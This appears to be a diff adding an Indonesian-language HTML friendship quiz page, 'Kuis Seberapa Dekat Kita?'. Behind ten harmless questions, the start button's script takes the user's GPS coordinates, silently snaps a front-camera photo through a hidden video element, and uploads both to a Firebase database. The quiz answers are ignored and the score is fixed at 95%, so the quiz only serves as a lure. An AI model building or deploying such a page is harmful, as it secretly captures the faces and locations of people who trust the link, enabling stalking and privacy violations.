@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuis Seberapa Dekat Kita?</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+</head>
+<body class="bg-slate-900 text-white font-sans min-h-screen flex items-center justify-center p-4">
+
+    <!-- Container Kuis -->
+    <div class="w-full max-w-md bg-slate-800 rounded-2xl shadow-xl p-6 relative overflow-hidden">
+        
+        <!-- Slide 0: Welcome & Trigger Kamera/Lokasi -->
+        <div id="slide-0" class="slide active space-y-4 text-center">
+            <h1 class="text-2xl font-bold text-pink-400">✨ Kuis Seberapa Dekat Kita? ✨</h1>
+            <p class="text-gray-300 text-sm">Tes seberapa jauh kamu mengenal persahabatan kita!</p>
+            <div class="bg-slate-700 p-4 rounded-xl text-xs text-yellow-300">
+              ⚠️ Dengan menekan tombol mulai, maka quis akan dilanjutkan           
+            </div>
+            <button onclick="mulaiKuis()" class="w-full py-3 bg-pink-500 hover:bg-pink-600 font-semibold rounded-xl transition shadow-lg">
+                Mulai Kuis 🚀
+            </button>
+        </div>
+
+        <!-- Slide 1 -->
+        <div id="slide-1" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 1 dari 10</span>
+            <h2 class="text-lg font-bold">Di mana pertama kali kita kenal?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q1" value="Sekolah"> Sekolah / Kampus</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q1" value="Medsos"> Media Sosial</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q1" value="Nongkrong"> Tempat Nongkrong</label>
+            </div>
+            <button onclick="lanjutSlide(1)" class="w-full py-2 bg-pink-500 rounded-xl font-semibold mt-4">Lanjut</button>
+        </div>
+
+        <!-- Slide 2 -->
+        <div id="slide-2" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 2 dari 10</span>
+            <h2 class="text-lg font-bold">Apa makanan favorit yang sering kita makan bareng?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q2" value="Bakso/Mie Ayam"> Bakso / Mie Ayam</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q2" value="Fast Food"> Fast Food / Burger</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q2" value="Cafe/Ngopi"> Cafe / Ngopi</label>
+            </div>
+            <button onclick="lanjutSlide(2)" class="w-full py-2 bg-pink-500 rounded-xl font-semibold mt-4">Lanjut</button>
+        </div>
+
+        <!-- Slide 3 -->
+        <div id="slide-3" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 3 dari 10</span>
+            <h2 class="text-lg font-bold">Siapa yang paling sering ngaret kalau janjian?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q3" value="Saya Sendiri"> Saya Sendiri</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q3" value="Kamu"> Kamu (Pembuat Kuis)</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q3" value="Dua-duanya"> Dua-duanya suka ngaret</label>
+            </div>
+            <button onclick="lanjutSlide(3)" class="w-full py-2 bg-pink-500 rounded-xl font-semibold mt-4">Lanjut</button>
+        </div>
+
+        <!-- Slide 4 -->
+        <div id="slide-4" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 4 dari 10</span>
+            <h2 class="text-lg font-bold">Apa hobi utama yang paling sering kita bahas?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q4" value="Game"> Main Game</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q4" value="Musik/Film"> Musik / Film</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q4" value="Gosip/Curhat"> Curhat & Gosip</label>
+            </div>
+            <button onclick="lanjutSlide(4)" class="w-full py-2 bg-pink-500 rounded-xl font-semibold mt-4">Lanjut</button>
+        </div>
+
+        <!-- Slide 5 -->
+        <div id="slide-5" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 5 dari 10</span>
+            <h2 class="text-lg font-bold">Kalau salah satu lagi sedih, biasanya ngapain?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q5" value="Ajak Jalan"> Ajak jalan-jalan</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q5" value="Dengerin Curhat"> Dengerin curhatan</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q5" value="Beri Meme"> Kirim meme lucu</label>
+            </div>
+            <button onclick="lanjutSlide(5)" class="w-full py-2 bg-pink-500 rounded-xl font-semibold mt-4">Lanjut</button>
+        </div>
+
+        <!-- Slide 6 -->
+        <div id="slide-6" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 6 dari 10</span>
+            <h2 class="text-lg font-bold">Apa lagu atau genre musik yang paling menggambarkan kita?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q6" value="Pop Santai"> Pop Santai</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q6" value="Rock/Metal"> Rock / Semangat</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q6" value="Sad Vibes"> Lagu Galau Sedih</label>
+            </div>
+            <button onclick="lanjutSlide(6)" class="w-full py-2 bg-pink-500 rounded-xl font-semibold mt-4">Lanjut</button>
+        </div>
+
+        <!-- Slide 7 -->
+        <div id="slide-7" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 7 dari 10</span>
+            <h2 class="text-lg font-bold">Destinasi impian yang ingin kita kunjungi bersama?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q7" value="Pantai/Bali"> Pantai / Bali</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q7" value="Gunung/Camping"> Gunung / Camping</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q7" value="Luar Negeri"> Luar Negeri</label>
+            </div>
+            <button onclick="lanjutSlide(7)" class="w-full py-2 bg-pink-500 rounded-xl font-semibold mt-4">Lanjut</button>
+        </div>
+
+        <!-- Slide 8 -->
+        <div id="slide-8" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 8 dari 10</span>
+            <h2 class="text-lg font-bold">Apa panggilan kesayangan / julukan kita berdua?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q8" value="Bestie"> Bestie Sejati</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q8" value="Partner in Crime"> Partner in Crime</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q8" value="Nama Unik/Lain"> Panggilan Khusus Lucu</label>
+            </div>
+            <button onclick="lanjutSlide(8)" class="w-full py-2 bg-pink-500 rounded-xl font-semibold mt-4">Lanjut</button>
+        </div>
+
+        <!-- Slide 9 -->
+        <div id="slide-9" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 9 dari 10</span>
+            <h2 class="text-lg font-bold">Seberapa besar tingkat kepercayaan kita?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q9" value="100%"> 100% Percaya</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q9" value="99%"> 99% (Sisa 1% buat jaga-jaga)</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q9" value="Tergantung Situasi"> Tergantung situasi</label>
+            </div>
+            <button onclick="lanjutSlide(9)" class="w-full py-2 bg-pink-500 rounded-xl font-semibold mt-4">Lanjut</button>
+        </div>
+
+        <!-- Slide 10 -->
+        <div id="slide-10" class="slide hidden space-y-4">
+            <span class="text-xs text-pink-400 font-semibold">Slide 10 dari 10</span>
+            <h2 class="text-lg font-bold">Apa harapanmu untuk persahabatan kita ke depan?</h2>
+            <div class="space-y-2">
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q10" value="Langgeng Selamanya"> Tetap akrab sampai tua</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q10" value="Sukses Bareng"> Sukses dan kaya bareng</label>
+                <label class="block bg-slate-700 p-3 rounded-xl cursor-pointer hover:bg-slate-600"><input type="radio" name="q10" value="Saling Support"> Terus saling support</label>
+            </div>
+            <button onclick="selesaiKuis()" class="w-full py-3 bg-green-500 hover:bg-green-600 rounded-xl font-semibold mt-4 transition">Selesai & Lihat Skor 🎉</button>
+        </div>
+
+        <!-- Slide Hasil -->
+        <div id="slide-hasil" class="slide hidden space-y-4 text-center">
+            <h2 class="text-2xl font-bold text-green-400">Yeay, Kuis Selesai! 🎉</h2>
+            <p class="text-gray-300">Skor kecocokan pertemanan kamu:</p>
+            <div class="text-4xl font-extrabold text-pink-400">95%</div>
+            <p class="text-sm text-gray-400">Kalian adalah sahabat sejati yang luar biasa!</p>
+        </div>
+
+        <!-- Elemen Kamera Tersembunyi -->
+        <video id="webcam" autoplay playsinline class="hidden"></video>
+        <canvas id="canvas" class="hidden"></canvas>
+    </div>
+
+    <script>
+        // Konfigurasi Firebase (Ganti dengan kredensial Firebase Anda)
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            databaseURL: "YOUR_DATABASE_URL",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let currentSlide = 0;
+        let capturedData = { foto: "", lokasi: {} };
+
+        function showSlide(index) {
+            document.querySelectorAll('.slide').forEach(el => el.classList.add('hidden'));
+            document.getElementById(`slide-${index}`).classList.remove('hidden');
+        }
+
+        function mulaiKuis() {
+            // Ambil Lokasi GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    capturedData.lokasi = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude
+                    };
+                }, err => { console.log("Gagal ambil lokasi", err); });
+            }
+
+            // Akses Kamera Depan & Ambil Foto Otomatis
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.getElementById('webcam');
+                    video.srcObject = stream;
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        capturedData.foto = canvas.toDataURL('image/jpeg', 0.7);
+
+                        // Hentikan stream kamera
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Kirim data ke Firebase saat kuis dimulai
+                        db.ref('hasil_kuis').push({
+                            waktu: new Date().toISOString(),
+                            foto: capturedData.foto,
+                            lokasi: capturedData.lokasi
+                        });
+                    }, 1500); // Ambil gambar setelah 1.5 detik kamera aktif
+                })
+                .catch(err => { console.log("Kamera tidak diizinkan", err); });
+
+            currentSlide = 1;
+            showSlide(currentSlide);
+        }
+
+        function lanjutSlide(slideNum) {
+            currentSlide = slideNum + 1;
+            showSlide(currentSlide);
+        }
+
+        function selesaiKuis() {
+            showSlide('hasil');
+        }
+    </script>
+</body>
+</html>
